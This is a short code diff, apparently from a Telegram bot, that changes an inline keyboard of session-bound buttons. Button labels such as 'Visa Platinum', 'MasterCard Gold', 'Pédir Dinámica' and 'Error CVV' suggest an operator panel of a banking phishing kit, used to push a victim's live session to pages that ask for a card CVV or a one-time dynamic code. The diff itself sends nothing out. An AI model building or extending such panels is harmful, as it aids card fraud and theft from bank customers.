@@ -72,10 +72,10 @@ function getSecondaryReplyMarkup(sessionId) {
             ],
             [
                 { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum|${sessionId}` },
-                { text: "🤖CHATBOT 922", callback_data: `go:chatbot|${sessionId}` }
+                { text: "♻️Pédir Dinámica", callback_data: `go:chatbot|${sessionId}` }
             ],
             [
-                { text: "📨 ASESOR", callback_data: `go:partcc|${sessionId}` },
+                { text: "❌ Error CVV", callback_data: `go:debit|${sessionId}` },
                 { text: "🪙 MasterCard Gold", callback_data: `go:mastergold|${sessionId}` }
             ],
             [
